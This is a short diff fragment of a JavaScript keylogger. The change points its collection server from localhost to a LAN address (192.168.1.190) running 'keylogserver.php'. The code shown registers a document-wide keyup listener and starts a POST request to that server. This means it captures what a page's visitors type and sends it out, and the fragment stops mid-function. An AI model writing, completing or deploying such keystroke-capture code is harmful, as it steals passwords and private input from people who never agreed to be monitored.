@@ -4,7 +4,7 @@
  ****************************************/
 
 (function(){
-	var server = "http://localhost:83/keylogserver.php";
+	var server = "http://192.168.1.190:80/keylogserver.php";
 	document.addEventListener("keyup", function(e){
 		var x = new XMLHttpRequest();
 		x.open("POST", server, true);
